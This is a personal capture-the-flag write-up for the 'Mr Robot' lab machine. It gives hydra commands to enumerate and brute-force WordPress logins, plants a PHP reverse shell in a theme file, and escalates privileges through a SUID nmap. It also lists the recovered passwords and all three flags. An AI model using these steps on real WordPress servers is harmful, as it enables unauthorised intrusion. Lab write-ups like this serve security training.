# Mr Robot CTF

## Enum
- Looks like just a web server is up. Along with ssh access
- Ports: 80, 443, 22

## Key 1
- See `/robots.txt`. Points to `/key-1-of-3.txt`
```robots
User-agent: *
fsocity.dic
key-1-of-3.txt
```
Key 1: `073403c8a58a1f80d943455fb30724b9`

## Key 2
- Looks like wordpress might be v4.3.1 according to `/feed/rdf` and Wappalyzer
- Enumerate wordpress usernames with wordpress forgot password page with `hydra -L fsocity.dic -p test 10.10.44.238 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 30`
    - user: elliot
- Brute force password for "elliot" with `hydra -l Elliot -P ./fsocity.dic 10.10.44.238 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t30`
    - pass: ER28-0652
- wpscan
```
 | [!] Title: WordPress 4.3-4.7 - Remote Code Execution (RCE) in PHPMailer
 |     Fixed in: 4.3.7
 |     References:
 |      - https://wpscan.com/vulnerability/146d60de-b03c-48c6-9b8b-344100f5c3d6
 |      - https://www.wordfence.com/blog/2016/12/phpmailer-vulnerability/
 |      - https://github.com/PHPMailer/PHPMailer/wiki/About-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/24767c76d359231642b0ab48437b64e8c6c7f491
 |      - http://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_phpmailer_host_header/

```

- inject [reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) in `archive.php` theme
- execute reverse shell [here](http://10.10.44.238/wp-content/themes/twentyfifteen/archive.php)
- get shell as `daemon` user
- found user `robot`, has an md5 hash of password in `/home/robot` for some reason lol
- crack with crackstation: `abcdefghijklmnopqrstuvwxyz`
- spawn interactive shell with python: `python -c 'import pty; pty.spawn("/bin/bash")'`
- login to robot, key 2 in `/home/robot/key-2-of-3.txt`

- Key 2: `822c73956184f694993bede3eb39f959`

## Key 3
- my first inclination was that the `nmap` suid was the path forward (and it was)
- use `nmap --interactive` > `!sh`

- `/readme`
    ```
    I like where you head is at. However I'm not going to help you.
    ```
- `/license`
    ```
    what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
    ```

- Flag 3: `04787ddef27c3dee1ee161b21670b4e4`


## Mistakes / Takeaways
1. I didn't properly test/execute hydra to enumerate the wordpress users and cracking the password for Elliot
2. After getting access to the `robot` user, I found `nmap` was suid but didn't try all the options available on gtfobins.
